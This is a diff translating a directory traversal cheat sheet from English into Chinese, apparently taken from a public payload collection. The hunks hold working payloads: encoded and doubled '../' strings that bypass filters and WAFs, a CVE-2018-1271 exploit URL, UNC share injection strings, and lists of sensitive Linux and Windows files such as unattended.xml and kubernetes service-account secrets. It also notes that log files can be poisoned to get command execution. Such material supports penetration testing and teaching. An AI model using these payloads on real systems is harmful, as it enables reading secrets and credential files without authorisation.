@@ -1,6 +1,6 @@
-# Directory traversal
+# 目录遍历
 
-> A directory or path traversal consists in exploiting insufficient security validation / sanitization of user-supplied input file names, so that characters representing "traverse to parent directory" are passed through to the file APIs.
+> 目录或路径遍历是利用用户提供的输入文件名的安全性验证/清理不够，以便将表示“遍历到父目录”的字符传递给文件api。
 
 ## Summary
 
@@ -27,7 +27,7 @@
 
 ## Basic exploitation
 
-We can use the `..` characters to access the parent directory, the following strings are several encoding that can help you bypass a poorly implemented filter.
+我们使用 `..` 字符来访问上层目录，下面的字符串是几种可以帮助您绕过防护不佳的筛选器的编码。
 
 ```powershell
 ../
@@ -40,7 +40,7 @@ We can use the `..` characters to access the parent directory, the following str
 %uff0e%uff0e%u2216
 ```
 
-### 16 bits Unicode encoding
+### 16 位 Unicode 编码
 
 ```powershell
 . = %u002e
@@ -48,7 +48,7 @@ We can use the `..` characters to access the parent directory, the following str
 \ = %u2216
 ```
 
-### UTF-8 Unicode encoding
+### UTF-8 Unicode 编码
 
 ```powershell
 . = %c0%2e, %e0%40%ae, %c0ae
@@ -56,22 +56,22 @@ We can use the `..` characters to access the parent directory, the following str
 \ = %c0%5c, %c0%80%5c
 ```
 
-### Bypass "../" replaced by ""
-Sometimes you encounter a WAF which remove the "../" characters from the strings, just duplicate them.
+### 用 "" 绕过 "../" 
+有时你会遇到一个WAF，它删除了“..”/"字符串中的字符，复制它们。
 
 ```powershell
 ..././
 ...\.\
 ```
 
-### Bypass "../" with ";"
+### 用 ";" 绕过 "../" 
 
 ```powershell
 ..;/
 http://domain.tld/page.jsp?include=..;/..;/sensitive.txt 
 ```
 
-### Double URL encoding
+### 双 URL 编码
 
 ```powershell
 . = %252e
@@ -79,11 +79,11 @@ http://domain.tld/page.jsp?include=..;/..;/sensitive.txt
 \ = %255c
 ```
 
-**e.g:** Spring MVC Directory Traversal Vulnerability (CVE-2018-1271) with `http://localhost:8080/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini`
+**e.g:** Spring MVC 目录遍历漏洞 (CVE-2018-1271) 使用 `http://localhost:8080/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini`
 
-### UNC Bypass
+### UNC 绕过
 
-An attacker can inject a Windows UNC share ('\\UNC\share\name') into a software system to potentially redirect access to an unintended location or arbitrary file.
+攻击者可以将Windows UNC共享('\\UNC\share\name')注入到软件系统中，从而可能将访问重定向到任意的位置或任意文件。
 
 ```powershell
 \\localhost\c$\windows\win.ini
@@ -92,7 +92,7 @@ An attacker can inject a Windows UNC share ('\\UNC\share\name') into a software 
 
 ## Path Traversal
 
-### Interesting Linux files
+### 引人注目的 Linux 文件
 
 ```powershell
 /etc/issue
@@ -119,9 +119,9 @@ An attacker can inject a Windows UNC share ('\\UNC\share\name') into a software 
 /var/run/secrets/kubernetes.io/serviceaccount
 ```
 
-### Interesting Windows files
+### 引人注目的 Windows 文件
 
-Interesting files to check out (Extracted from https://github.com/soffensive/windowsblindread)
+检查引人注目的文件 (转自 https://github.com/soffensive/windowsblindread)
 
 ```powershell
 c:/boot.ini
@@ -146,7 +146,7 @@ c:/unattended.txt
 c:/unattended.xml
 ```
 
-The following log files are controllable and can be included with an evil payload to achieve a command execution
+以下日志文件是可控的，可以包含在恶意payload中以实现命令执行
 
 ```powershell
 /var/log/apache/access.log
